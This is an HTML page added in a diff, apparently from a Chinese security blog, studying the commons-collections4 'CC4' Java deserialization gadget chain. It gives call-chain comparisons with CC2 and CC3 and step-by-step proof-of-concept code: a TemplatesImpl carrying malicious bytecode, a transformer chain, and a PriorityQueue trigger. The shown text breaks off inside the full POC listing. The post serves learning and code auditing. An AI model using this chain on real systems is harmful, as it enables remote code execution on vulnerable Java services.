@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>CC4 - 东隅 Blog</title><meta name="author" content="东隅">
+<meta name="author-link" content="">
+<meta name="description" content="" /><meta name="keywords" content='代码审计, java安全' />
+  <meta itemprop="name" content="CC4">
+  <meta itemprop="datePublished" content="2024-09-11T15:35:01+08:00">
+  <meta itemprop="dateModified" content="2024-09-11T15:35:01+08:00">
+  <meta itemprop="wordCount" content="334">
+  <meta itemprop="keywords" content="代码审计,Java安全"><meta property="og:url" content="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/cc4/">
+  <meta property="og:site_name" content="东隅 Blog">
+  <meta property="og:title" content="CC4">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2024-09-11T15:35:01+08:00">
+    <meta property="article:modified_time" content="2024-09-11T15:35:01+08:00">
+    <meta property="article:tag" content="代码审计">
+    <meta property="article:tag" content="Java安全">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="CC4">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/cc4/" /><link rel="prev" href="https://dongyu29.github.io/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/java%E5%AE%89%E5%85%A8/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" /><link rel="next" href="https://dongyu29.github.io/about/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "CC4",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/java%E5%AE%89%E5%85%A8\/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\/cc4\/"
+    },"image": ["https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"],"genre": "posts","keywords": "代码审计, java安全","wordcount":  334 ,
+    "url": "https:\/\/dongyu29.github.io\/posts\/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6\/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1\/java%E5%AE%89%E5%85%A8\/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\/cc4\/","datePublished": "2024-09-11T15:35:01+08:00","dateModified": "2024-09-11T15:35:01+08:00","publisher": {
+      "@type": "Organization",
+      "name": "","logo": "https:\/\/raw.githubusercontent.com\/dongyu29\/dongyu29.github.io\/main\/favicon.ico"},"author": {
+        "@type": "Person",
+        "name": "东隅"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                
+                
+              ></a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title="Switch Theme">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="东隅 Blog"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅 Blog" data-title="东隅 Blog" width="26" height="26" class="logo" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/><span class="header-title-pre"> </span><span class="typeit"><template> 东隅 Blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ><i class="fa-regular fa-id-card fa-fw fa-sm fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  
+                  
+                ></a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><nav aria-label="breadcrumb" class="breadcrumb-container sticky">
+    <ol class="breadcrumb"><li class="breadcrumb-item"><a href="/" title="东隅 Blog">Home</a></li><li class="breadcrumb-item"><a href="/posts/" title="Posts">Posts</a></li><li class="breadcrumb-item active" aria-current="page">CC4</li>
+    </ol>
+  </nav><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span title="Repost" class="icon-repost"><i class="fa-solid x" aria-hidden="true"></i></span><span>CC4</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://raw.githubusercontent.com/dongyu29/dongyu29.github.io/main/favicon.ico" alt="东隅" data-title="东隅" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;东隅</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category" title="Category - 代码审计"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 代码审计</a></span></div><div class="post-meta-line"><span title="published on 2024-09-11 15:35:01"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-09-11">2024-09-11</time></span>&nbsp;<span title="334 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 400 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>2 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前置知识">前置知识</a></li>
+    <li><a href="#写poc">写POC</a></li>
+    <li><a href="#动态调试">动态调试</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="-----（完）-----"><h2 id="前置知识" class="heading-element"><span>前置知识</span>
+  <a href="#%e5%89%8d%e7%bd%ae%e7%9f%a5%e8%af%86" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>CC4和CC2的依赖都是<code>commons-collections4</code>，貌似和CC2也是很像的，也有人说CC4就是CC2和CC3的杂交</p>
+<p>我是先学的CC2，这里贴一下Gadget对比一下</p>
+<p>CC2</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#58a1dd">ObjectInputStream</span>.<span style="color:#58a1dd">readObject</span>()
+</span></span><span style="display:flex;"><span>			<span style="color:#58a1dd">PriorityQueue</span>.<span style="color:#58a1dd">readObject</span>()
+</span></span><span style="display:flex;"><span>			<span style="color:#58a1dd">PriorityQueue</span>.<span style="color:#58a1dd">heapify</span>()
+</span></span><span style="display:flex;"><span>			<span style="color:#58a1dd">PriorityQueue</span>.<span style="color:#58a1dd">siftDown</span>()
+</span></span><span style="display:flex;"><span>			<span style="color:#58a1dd">PriorityQueue</span>.<span style="color:#58a1dd">siftDownUsingComparator</span>()
+</span></span><span style="display:flex;"><span>			
+</span></span><span style="display:flex;"><span>					<span style="color:#58a1dd">TransformingComparator</span>.<span style="color:#58a1dd">compare</span>()
+</span></span><span style="display:flex;"><span>						<span style="color:#58a1dd">InvokerTransformer</span>.<span style="color:#58a1dd">transform</span>()
+</span></span><span style="display:flex;"><span>							<span style="color:#58a1dd">Method</span>.<span style="color:#58a1dd">invoke</span>()
+</span></span><span style="display:flex;"><span>								<span style="color:#58a1dd">Runtime</span>.<span style="color:#58a1dd">exec</span>()</span></span></code></pre></div><p>CC3</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#58a1dd">TransformedMap</span><span style="color:#ff636f">-&gt;</span><span style="color:#58a1dd">transformerChain的transform</span><span style="color:#ff636f">-&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">InstantiateTransformer的transform</span> <span style="color:#ff636f">-&gt;</span> <span style="color:#58a1dd">TrAXFilter的构造函数</span><span style="color:#ff636f">-&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#ff636f">-&gt;</span> <span style="color:#58a1dd">TemplatesImpl</span>#<span style="color:#58a1dd">newTransformer</span>() <span style="color:#ff636f">-&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">TemplatesImpl</span>#<span style="color:#58a1dd">getTransletInstance</span>() <span style="color:#ff636f">-&gt;</span> <span style="color:#58a1dd">TemplatesImpl</span>#<span style="color:#58a1dd">defineTransletClasses</span>()
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">-&gt;</span> <span style="color:#58a1dd">TransletClassLoader</span>#<span style="color:#58a1dd">defineClass</span>()</span></span></code></pre></div><p>CC4</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#58a1dd">ObjectInputStream</span>.<span style="color:#58a1dd">readObject</span>()
+</span></span><span style="display:flex;"><span>    <span style="color:#58a1dd">PriorityQueue</span>.<span style="color:#58a1dd">readObject</span>()
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">PriorityQueue</span>.<span style="color:#58a1dd">heapify</span>()
+</span></span><span style="display:flex;"><span>            <span style="color:#58a1dd">PriorityQueue</span>.<span style="color:#58a1dd">siftDown</span>()
+</span></span><span style="display:flex;"><span>                <span style="color:#58a1dd">PriorityQueue</span>.<span style="color:#58a1dd">siftDownUsingComparator</span>()
+</span></span><span style="display:flex;"><span>                    <span style="color:#58a1dd">TransformingComparator</span>.<span style="color:#58a1dd">compare</span>()
+</span></span><span style="display:flex;"><span>                        <span style="color:#58a1dd">ChainedTransformer</span>.<span style="color:#58a1dd">transform</span>()   <span style="color:#828b96;font-style:italic">//这里是和CC2的不同了</span>
+</span></span><span style="display:flex;"><span>                            <span style="color:#58a1dd">ConstantTransformer</span>.<span style="color:#58a1dd">transform</span>()   <span style="color:#828b96;font-style:italic">//ConstantTransformer承接一下</span>
+</span></span><span style="display:flex;"><span>                            <span style="color:#58a1dd">InstantiateTransformer</span>.<span style="color:#58a1dd">transform</span>()    <span style="color:#828b96;font-style:italic">//下面就和CC3的后半段一样的了</span>
+</span></span><span style="display:flex;"><span>                            <span style="color:#58a1dd">newInstance</span>()
+</span></span><span style="display:flex;"><span>                                <span style="color:#58a1dd">TrAXFilter</span>#<span style="color:#58a1dd">TrAXFilter</span>()
+</span></span><span style="display:flex;"><span>                                <span style="color:#58a1dd">TemplatesImpl</span>.<span style="color:#58a1dd">newTransformer</span>()
+</span></span><span style="display:flex;"><span>                                         <span style="color:#58a1dd">TemplatesImpl</span>.<span style="color:#58a1dd">getTransletInstance</span>()
+</span></span><span style="display:flex;"><span>                                         <span style="color:#58a1dd">TemplatesImpl</span>.<span style="color:#58a1dd">defineTransletClasses</span>.<span style="color:#58a1dd">newInstance</span>()
+</span></span><span style="display:flex;"><span>                                            <span style="color:#58a1dd">Runtime</span>.<span style="color:#58a1dd">exec</span>()</span></span></code></pre></div><p>从PQ（PriorityQueue）调到   TransformingComparator.compare()调用某个类的transform是十分丝滑的，这里也不说了，重点看看后面是怎么承接的</p>
+<p>CC2里面是直接去调InvokerTransformer，这里可能是考虑被过滤的原因吧，不走这条道了，还是往tempslate执行字节码那里引</p>
+<p>ConstantTransformer.transform() 老朋友了，感觉都挺熟悉的</p>
+<h2 id="写poc" class="heading-element"><span>写POC</span>
+  <a href="#%e5%86%99poc" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>首先还是原来的这俩函数</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">setFieldValue</span>(<span style="color:#58a1dd">Object</span> <span style="color:#58a1dd">obj</span>, <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">fieldName</span>, <span style="color:#58a1dd">Object</span> <span style="color:#58a1dd">value</span>) <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">Exception</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Field</span> <span style="color:#58a1dd">field</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">obj</span>.<span style="color:#58a1dd">getClass</span>().<span style="color:#58a1dd">getDeclaredField</span>(<span style="color:#58a1dd">fieldName</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">field</span>.<span style="color:#58a1dd">setAccessible</span>(<span style="color:#ff636f">true</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">field</span>.<span style="color:#58a1dd">set</span>(<span style="color:#58a1dd">obj</span>, <span style="color:#58a1dd">value</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">protected</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">byte</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">getBytescode</span>() <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">Exception</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">ClassPool</span> <span style="color:#58a1dd">pool</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">ClassPool</span>.<span style="color:#58a1dd">getDefault</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">CtClass</span> <span style="color:#58a1dd">clazz</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">pool</span>.<span style="color:#58a1dd">get</span>(<span style="color:#58a1dd">com</span>.<span style="color:#58a1dd">test</span>.<span style="color:#58a1dd">CC2</span>.<span style="color:#58a1dd">Evil</span>.<span style="color:#58a1dd">class</span>.<span style="color:#58a1dd">getName</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#ff636f">return</span> <span style="color:#58a1dd">clazz</span>.<span style="color:#58a1dd">toBytecode</span>();
+</span></span><span style="display:flex;"><span>    }</span></span></code></pre></div><p>然后构造一个恶意的tempslate</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#58a1dd">TemplatesImpl</span> <span style="color:#58a1dd">obj</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">TemplatesImpl</span>();
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">setFieldValue</span>(<span style="color:#58a1dd">obj</span>, <span style="color:#a6be9d">&#34;_bytecodes&#34;</span>, <span style="color:#ff636f">new</span> <span style="color:#ff636f">byte</span><span style="color:#ff636f">[][]</span>{<span style="color:#58a1dd">getBytescode</span>()});
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">setFieldValue</span>(<span style="color:#58a1dd">obj</span>, <span style="color:#a6be9d">&#34;_name&#34;</span>, <span style="color:#a6be9d">&#34;HelloTemplatesImpl&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">setFieldValue</span>(<span style="color:#58a1dd">obj</span>, <span style="color:#a6be9d">&#34;_tfactory&#34;</span>, <span style="color:#ff636f">new</span> <span style="color:#58a1dd">TransformerFactoryImpl</span>());</span></span></code></pre></div><p>tempslate是ChainedTransformer里面的东西触发的，还是搞一个真的一个假的</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#58a1dd">Transformer</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">fakeTransformers</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Transformer</span><span style="color:#ff636f">[]</span> {<span style="color:#ff636f">new</span> <span style="color:#58a1dd">ConstantTransformer</span>(<span style="color:#58a1dd">1</span>)};
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">Transformer</span><span style="color:#ff636f">[]</span> <span style="color:#58a1dd">transformers</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">Transformer</span><span style="color:#ff636f">[]</span>{
+</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">new</span> <span style="color:#58a1dd">ConstantTransformer</span>(<span style="color:#58a1dd">TrAXFilter</span>.<span style="color:#58a1dd">class</span>),
+</span></span><span style="display:flex;"><span>                <span style="color:#ff636f">new</span> <span style="color:#58a1dd">InstantiateTransformer</span>(<span style="color:#ff636f">new</span> <span style="color:#58a1dd">Class</span><span style="color:#ff636f">[]</span> { <span style="color:#58a1dd">Templates</span>.<span style="color:#58a1dd">class</span> },<span style="color:#ff636f">new</span> <span style="color:#58a1dd">Object</span><span style="color:#ff636f">[]</span> { <span style="color:#58a1dd">obj</span> })
+</span></span><span style="display:flex;"><span>        };</span></span></code></pre></div><p>套在chainedtransform里</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#58a1dd">ChainedTransformer</span> <span style="color:#58a1dd">chain</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">ChainedTransformer</span>(<span style="color:#58a1dd">fakeTransformers</span>);</span></span></code></pre></div><p>往PQ里塞进去TransformingComparator（后面会调用它的transform）,再往里塞俩元素，然后再反射把那个fake的给换掉</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#58a1dd">PriorityQueue</span><span style="color:#ff636f">&lt;</span><span style="color:#58a1dd">Object</span><span style="color:#ff636f">&gt;</span> <span style="color:#58a1dd">queue</span> <span style="color:#ff636f">=</span> <span style="color:#ff636f">new</span> <span style="color:#58a1dd">PriorityQueue</span><span style="color:#ff636f">&lt;</span><span style="color:#58a1dd">Object</span><span style="color:#ff636f">&gt;</span>(<span style="color:#58a1dd">2</span>, <span style="color:#ff636f">new</span> <span style="color:#58a1dd">TransformingComparator</span>(<span style="color:#58a1dd">chain</span>));
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">queue</span>.<span style="color:#58a1dd">add</span>(<span style="color:#58a1dd">obj</span>);
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">queue</span>.<span style="color:#58a1dd">add</span>(<span style="color:#58a1dd">obj</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#58a1dd">setFieldValue</span>(<span style="color:#58a1dd">chain</span>, <span style="color:#a6be9d">&#34;iTransformers&#34;</span>, <span style="color:#58a1dd">transformers</span>);</span></span></code></pre></div><p>POC</p>
+<div class="highlight"><pre tabindex="0" style="color:#1d2432;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff636f">package</span> <span style="color:#58a1dd">com.test.CC4</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.util.PriorityQueue</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javax.xml.transform.Templates</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">org.apache.commons.collections4.Transformer</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">org.apache.commons.collections4.comparators.TransformingComparator</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">org.apache.commons.collections4.functors.ChainedTransformer</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">org.apache.commons.collections4.functors.ConstantTransformer</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">org.apache.commons.collections4.functors.InstantiateTransformer</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javassist.ClassPool</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">javassist.CtClass</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.io.ByteArrayInputStream</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.io.ByteArrayOutputStream</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.io.ObjectInputStream</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.io.ObjectOutputStream</span>;
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">import</span> <span style="color:#58a1dd">java.lang.reflect.Field</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff636f">public</span> <span style="color:#ff636f">class</span> <span style="color:#58a1dd">main</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff636f">public</span> <span style="color:#ff636f">static</span> <span style="color:#ff636f">void</span> <span style="color:#58a1dd">setFieldValue</span>(<span style="color:#58a1dd">Object</span> <span style="color:#58a1dd">obj</span>, <span style="color:#58a1dd">String</span> <span style="color:#58a1dd">fieldName</span>, <span style="color:#58a1dd">Object</span> <span style="color:#58a1dd">value</span>) <span style="color:#ff636f">throws</span> <span style="color:#58a1dd">Exception</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">Field</span> <span style="color:#58a1dd">field</span> <span style="color:#ff636f">=</span> <span style="color:#58a1dd">obj</span>.<span style="color:#58a1dd">getClass</span>().<span style="color:#58a1dd">getDeclaredField</span>(<span style="color:#58a1dd">fieldName</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#58a1dd">field</span>.<span style="color:#58a1dd">setAccessible</span>(<span style="color:#ff636f">true</span>);
